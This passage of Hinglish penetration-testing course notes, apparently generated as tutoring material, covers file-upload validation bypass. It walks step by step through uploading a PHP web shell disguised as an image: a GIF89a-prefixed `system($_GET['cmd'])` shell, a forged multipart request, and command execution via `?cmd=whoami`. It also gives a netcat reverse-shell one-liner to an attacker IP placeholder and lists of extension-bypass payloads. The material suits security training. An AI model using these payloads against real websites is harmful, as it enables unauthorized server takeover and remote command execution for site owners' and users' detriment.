+       | 1. User file select karta hai: shell.php
+       V
+[Client-side JS Check]
+       |-- Extension check? (.php allowed?)
+       |-- Size check? (>2MB?)
+       |-- Agar fail hua toh error message
+       V
+[Burp Suite Intercept]
+       |
+       | 2. Attacker request modify karta hai:
+       |    - filename="shell.jpg"
+       |    - Content-Type: image/jpeg
+       V
+[Server-side Validation]
+       |
+       | 3. Server checks (agar implement kiya hai):
+       |    a) Content-Type header -> image/jpeg? OK
+       |    b) File extension (from filename) -> .jpg? OK
+       |    c) File content magic bytes -> check karega?
+       |    d) Size limit -> check karega?
+       V
+[Server saves file]
+       |
+       | 4. Agar validation pass, file save hoti hai
+       |    Usually /uploads/ folder mein
+       V
+[File on Server]
+       |
+       | shell.jpg (actually PHP code andar hai)
+       | Lekin server .jpg ko PHP ki tarah execute nahi karega!
+       |
+       V
+[Attacker needs to]
+       | - File ko .php extension dilana
+       | - Ya server misconfiguration exploit karna
+```
+
+**Magic Bytes kya hain?**
+Har file ke starting mein kuch specific bytes hote hain jo file type identify karte hain:
+- JPEG: `FF D8 FF E0`
+- PNG: `89 50 4E 47`
+- GIF: `47 49 46 38`
+- PDF: `25 50 44 46`
+
+Advanced servers inhe check karte hain. Toh tumhe PHP code ke pehle ye bytes add karne padte hain.
+
+## 💻 7. Hands-On: Step-by-Step Practical
+
+**Scenario 1: Sirf Content-Type check ho raha hai**
+
+**Step 1: Ek simple PHP shell banayo**
+
+```text
+Apne computer mein ek file banao: shell.php
+Usme yeh likho:
+```
+
+```php
+GIF89a
+<?php system($_GET['cmd']); ?>
+```
+(Note: GIF89a magic byte hai - kuch servers sirf yeh dekhkar GIF samajh lenge)
+
+**Step 2: Website par file upload form dhundho**
+
+```text
+Target website kholo
+Koi bhi file upload form dhundho (profile pic, attachment, etc.)
+Ek real image select karo (jaise 1.jpg)
+Upload button dabao
+```
+
+**Step 3: Request intercept karo**
+
+```text
+Burp Suite mein Proxy → Intercept ON
+Upload button dabate hi request intercept ho jayegi
+```
+
+**Step 4: Request modify karo**
+
+```text
+Request mein yeh changes karo:
+
+1. Filename change karo:
+   filename="shell.php" → filename="shell.jpg"
+
+2. Content-Type change karo (agar different ho toh):
+   Content-Type: application/x-php → Content-Type: image/jpeg
+
+3. File content mein GIF89a add karo (agar file mein nahi hai toh)
+
+Modified request aise dikhegi:
+
+POST /upload.php HTTP/1.1
+Host: target.com
+Content-Type: multipart/form-data; boundary=----12345
+Content-Length: 456
+
+------12345
+Content-Disposition: form-data; name="file"; filename="shell.jpg"
+Content-Type: image/jpeg
+
+GIF89a
+<?php system($_GET['cmd']); ?>
+------12345--
+```
+
+**Step 5: Request forward karo**
+
+```text
+"Forward" button click karo
+Response dekho - "Upload successful" aana chahiye
+```
+
+**Step 6: Uploaded file ko access karo**
+
+```text
+Try karo:
+http://target.com/uploads/shell.jpg?cmd=whoami
+
+Agar PHP execute ho raha hai toh output dikhega
+Nahi toh 500 error ya blank page aayega
+```
+
+**Scenario 2: Max Length Limit Bypass**
+
+**Step 1: Length limit pata karo**
+
+```text
+Ek chhoti file upload karo (10 bytes)
+Ek badi file upload karo (1MB)
+Dekho kitni size allow hai - error message dekhlo
+```
+
+**Step 2: File ko chunks mein todo**
+
+```text
+Maano server 100 bytes allow karta hai
+Tumhara shell.php 200 bytes ka hai
+
+Tum do parts mein bhejo:
+Part 1: first 100 bytes
+Part 2: last 100 bytes
+
+Lekin ye tricky hai - server usually ek saath pura file leta hai
+Better approach: compression use karo ya short payload
+```
+
+**Short reverse shell example (73 bytes):**
+```php
+<?php `nc -e /bin/sh YOUR_IP 4444`; ?>
+```
+
+**Scenario 3: Extension bypass techniques**
+
+**Double extension:**
+```
+filename="shell.php.jpg"  → Server sirf last extension dekhega? .jpg
+filename="shell.php;.jpg" → URL encoding issues
+filename="shell.php%00.jpg" → Null byte injection (old PHP versions)
+filename="shell.phtml"     → Alternate PHP extensions
+filename="shell.php5"      → PHP 5 extension
+```
+
+## ⚖️ 8. Comparison (Ye vs Woh)
+
+| Bypass Technique | Kaise Kaam Karta Hai | Success Rate | Detection Chance |
+|------------------|----------------------|--------------|------------------|
+| **Content-Type modify** | Header change karo | High (agar sirf header check) | Low |
+| **Double extension** | shell.php.jpg | Medium (agar poor validation) | Medium |
+| **Magic bytes** | GIF89a add karo | High (agar content check ho) | Low |
+| **Null byte** | shell.php%00.jpg | Low (patched in new PHP) | High |
+| **Size bypass** | Chhota payload | High (agar size limit strict) | Low |
+
+## 🚫 9. Common Mistakes (Beginner Traps)
+
+- **Mistake 1:** Sirf Content-Type change karna aur filename change karna bhool jana
+  - **Fix:** Dono ek saath karo - filename bhi .jpg karo aur Content-Type bhi image/jpeg
+
+- **Mistake 2:** Magic bytes add karna bhool jana jab server content check kare
+  - **Fix:** Hamesha GIF89a ya real image ke bytes copy karke add karo
+
+- **Mistake 3:** Uploaded file ka path pata na hona
+  - **Fix:** Response check karo - kabhi file ka path return hota hai. Ya common paths try karo: /uploads/, /files/, /images/, /user_uploads/
+
+- **Mistake 4:** PHP code execute nahi ho raha but sochna ki upload fail ho gaya
+  - **Fix:** Server .jpg files PHP ki tarah execute nahi karta. Isliye filename .php hona chahiye ya server misconfiguration chahiye ki .jpg bhi execute ho
+
+## 🤔 10. Agar Dimag Ghoom Rahe Hai? (Confusion Clarifier)
+
+**Confusion 1: "Content-Type change kar diya, file bhi .jpg kar di, phir bhi execute nahi ho raha?"**
+
+Beta, server do cheezein check karta hai - upload time validation aur execution time configuration. Upload to ho gayi file, lekin jab tum usse access karoge, server dekhega ki file extension .jpg hai, toh usse PHP ki tarah execute nahi karega. Isliye tumhe chahiye ki:
+- Ya toh file extension .php hi rahe (aur sirf Content-Type bypass karo)
+- Ya server misconfigured ho ki .jpg bhi PHP execute kare (rare)
+- Ya .htaccess file upload karo jo PHP execution enable kare
+
+**Confusion 2: "Magic bytes kya hote hain aur kaise add karein?"**
+
+Magic bytes file ke starting ke kuch specific bytes hote hain jo file type batate hain. Jaise GIF file ka starting `GIF89a` hota hai. Tum PHP code se pehle yeh likh do:
+```
+GIF89a
+<?php system($_GET['cmd']); ?>
+```
+Ab server file read karega to starting bytes dekhega - "GIF89a"! Samjhega yeh GIF hai. Lekin jab browser se request karo to poori file parse hogi aur PHP execute hoga.
+
+## 🌍 11. Real-World Use Case (Bug Bounty / Pentesting)
+
+**Scenario:** Ek bug bounty hunter ne **Facebook** ki ek subdomain par file upload functionality test ki. Sirf images allow thi. Usne ek PHP file banayi jisme usne GIF header daala:
+
+```
+GIF89a
+<?php echo "Hello"; ?>
+```
+
+**How they used it:**
+Usne file upload karte time request intercept ki aur filename `shell.php` rakha lekin Content-Type `image/gif` kar diya. Facebook ka server sirf Content-Type check kar raha tha, file content nahi!
+
+**Result:** File upload ho gayi! Lekin jab usne file access kiya to PHP execute nahi hua kyunki server ne .php extension ko block kar rakha tha. Phir usne .php5, .phtml try kiya - ek kaam kar gaya! Usne reverse shell upload kiya aur server ka control le liya.
+
+Facebook ne turant fix kiya aur hunter ko **$10,000** ka bounty diya! 🎉
+
+## 🎨 12. Visual Diagram (ASCII Art)
+
+```
+[Attacker creates malicious file]
+[shell.php with GIF89a header]
+       |
+       V
+[Upload Form on Website]
+       |
+       | 1. POST /upload.php
+       |    filename="shell.jpg"
+       |    Content-Type: image/jpeg
+       |    Body: GIF89a<?php ... ?>
+       V
+[Server Validation]
+       |
+       |-- Check 1: Content-Type = image/jpeg? → PASS
+       |-- Check 2: filename ends with .jpg? → PASS
+       |-- Check 3: Magic bytes = GIF89a? → PASS
+       |-- Check 4: Size < 2MB? → PASS
+       V
+[File saved on server]
+       |
+       | /uploads/shell.jpg (contains PHP code)
+       |
+       V
+[Attacker accesses file]
+       |
+       | GET /uploads/shell.jpg?cmd=whoami
+       | (Server executes PHP code inside)
+       V
+[Command output returned]
+       |
+       | www-data
+```
+
+## 🛠️ 13. Best Practices (Pro Tips)
+
+- **Tip 1:** Pehle simple `<?php echo "test"; ?>` upload karo. Isse pata chalega ki PHP execute ho raha hai ya nahi.
+- **Tip 2:** Extension bypass ke liye extension list rakho: `.php`, `.php5`, `.phtml`, `.php7`, `.phar`, `.inc`, `.asp`, `.aspx`, `.jsp`, `.cfm`
+- **Tip 3:** Content-Type bypass ke liye common MIME types: `image/jpeg`, `image/png`, `image/gif`, `application/pdf`, `text/plain`
+- **Tip 4:** Magic bytes ke liye real files se copy karo. Ek real GIF lo, uske starting 6 bytes copy karo, phir apna PHP code daalo.
+- **Tip 5:** Agar server file rename kar deta hai, toh response mein new filename dekho. Kabhi server random name de deta hai.
+
+## ⚠️ 14. Consequences of Failure (Agar galat kiya toh?)
+
+**Scenario 1: Content-Type sir change kiya, filename nahi badla**
+- Server extension check karega aur reject kar dega. Upload fail.
+
+**Scenario 2: GIF89a add kiya but uske baad PHP code mein syntax error**
+- File upload to ho jayegi lekin execute karte time PHP error aayega. Attacker ko pata chal jayega ki file upload hui hai aur wo fix kar sakta hai.
+
+**Scenario 3: Server ne file ka naam change kar diya (jaise random name)**
+- Tumhe pata nahi ki file kahan gayi. Isliye response hamesha check karo. Kabhi response mein path return hota hai.
+
+**Scenario 4: Server ne content scan kiya aur malicious code detect kar liya**
+- Upload reject ho jayega aur tumhara IP block ho sakta hai. Isliye simple payloads se start karo.
+
+## ❓ 15. FAQ (Interview Questions)
+
+**Q1: File upload validation mein common checks kaunse hain?**
+**A1:** Common checks:
+- File extension (blacklist/whitelist)
+- Content-Type header
+- File size
+- File content (magic bytes)
+- Image recompression (GD library)
+- Virus scan
+
+**Q2: Content-Type bypass kaise karte hain?**
+**A2:** Request intercept karke `Content-Type` header ko allowed MIME type mein change karo, jaise `application/x-php` ko `image/jpeg` mein. Agar server sirf header check karta hai toh bypass ho jayega.
+
+**Q3: Double extension attack kya hai?**
+**A3:** File name aise do: `shell.php.jpg`. Agar server sirf last extension check karta hai, toh .jpg allowed samjhega. Lekin agar server misconfigured hai ya Apache ke multiple extensions handle karne ki vulnerability hai, toh PHP execute ho sakta hai.
+
+**Q4: Magic bytes kyun add karte hain?**
+**A4:** Advanced servers sirf extension ya Content-Type nahi check karte, actual file content bhi check karte hain. Magic bytes (jaise GIF89a) dalne se file valid GIF jaisi lagti hai, lekin andar PHP code bhi hota hai.
+
+**Q5: File upload hone ke baad bhi shell execute nahi ho raha - kya reasons ho sakte?**
+**A5:** Possible reasons:
+1. File upload to uploads folder mein hui but uss folder mein PHP execution disable hai
+2. File extension .jpg hai aur server .jpg execute nahi karta
+3. File mein syntax error hai
+4. Server ne file rename kar di (extension change kar di)
+5. Server ne file content sanitize kar diya (PHP tags hata diye)
+
+## 📝 16. Ek Line Mein Yaad Rakhne Ko
+
+**"Content-Type ka label badlo, magic bytes ka jadoo dikhao, aur server ko bewakoof banao!"**
+
+---
+
+## 🎯 Module 10 Summary - Ek Nazar Mein
+
+| Topic | Key Point | Attack Vector |
+|-------|-----------|---------------|
+| **10.1 Risky Methods** | OPTIONS se pata karo kaunse methods enabled hain | PUT, DELETE, TRACE |
+| **10.2 Method Exploitation** | PUT se file upload, DELETE se file delete | Reverse shell, C99shell |
+| **10.3 File Upload Bypass** | Content-Type, extension, magic bytes se bypass | PHP shell, image polyglot |
+
+**Yaad Rakhne Ka Mantra:**
+"Pehle OPTIONS se menu dekho, phir PUT se khana rakho, agar na ho paye toh Content-Type ka label badlo!"
+
+---
+
+**Beta, yeh tha Module 10 ka complete notes!** 📚
+
+Koi doubt ho toh puchho. Ab tum:
+- HTTP methods ka risk samajh gaye
+- OPTIONS se enabled methods pata karna seekh gaye
+- PUT se file upload karna seekh gaye
+- Reverse shell dalna seekh gaye
+- File upload bypass techniques seekh gaye
+
+**Agla module konsa hai?** Module 11? Module 12? Batao, main taiyaar hoon! 💪
+
+========================================================================================
